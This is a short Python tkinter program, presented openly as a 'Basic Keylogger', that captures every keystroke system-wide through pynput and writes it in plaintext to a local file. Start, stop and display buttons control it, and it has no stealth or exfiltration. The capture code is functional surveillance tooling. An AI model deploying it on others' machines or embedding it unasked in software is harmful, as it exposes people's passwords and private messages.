import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import threading
import os

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Basic Keylogger")
        self.root.geometry("400x200")

        self.is_logging = False
        self.log_file = "key_log.txt"

        # Create widgets
        self.create_widgets()

    def create_widgets(self):
        # Instructions Label
        self.label = tk.Label(self.root, text="Click 'Start' to begin logging keystrokes.", font=("Helvetica", 12))
        self.label.pack(pady=10)

        # Start Button
        self.start_button = tk.Button(self.root, text="Start Logging", command=self.start_logging, font=("Helvetica", 12))
        self.start_button.pack(pady=5)

        # Stop Button
        self.stop_button = tk.Button(self.root, text="Stop Logging", command=self.stop_logging, font=("Helvetica", 12))
        self.stop_button.pack(pady=5)

        # Log Display Button
        self.display_button = tk.Button(self.root, text="Display Logs", command=self.display_logs, font=("Helvetica", 12))
        self.display_button.pack(pady=5)

    def on_press(self, key):
        try:
            with open(self.log_file, "a") as f:
                f.write(f"{key.char}\n")  # Record printable characters
        except AttributeError:
            with open(self.log_file, "a") as f:
                f.write(f"{key}\n")  # Record special keys

    def start_logging(self):
        if not self.is_logging:
            self.is_logging = True
            self.label.config(text="Keylogging started! Click 'Stop' to stop logging.")

            # Start keylogger in a separate thread
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()

            # Disable start button to avoid multiple clicks
            self.start_button.config(state=tk.DISABLED)

    def stop_logging(self):
        if self.is_logging:
            self.is_logging = False
            self.listener.stop()  # Stop the keylogger
            self.label.config(text="Keylogging stopped. Click 'Start' to begin again.")

            # Enable the start button
            self.start_button.config(state=tk.NORMAL)

    def display_logs(self):
        if os.path.exists(self.log_file):
            with open(self.log_file, "r") as f:
                logs = f.read()

            # Display the logs in a messagebox
            messagebox.showinfo("Logged Keystrokes", logs)
        else:
            messagebox.showinfo("No Logs", "No logs found.")

# Start the GUI application
if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
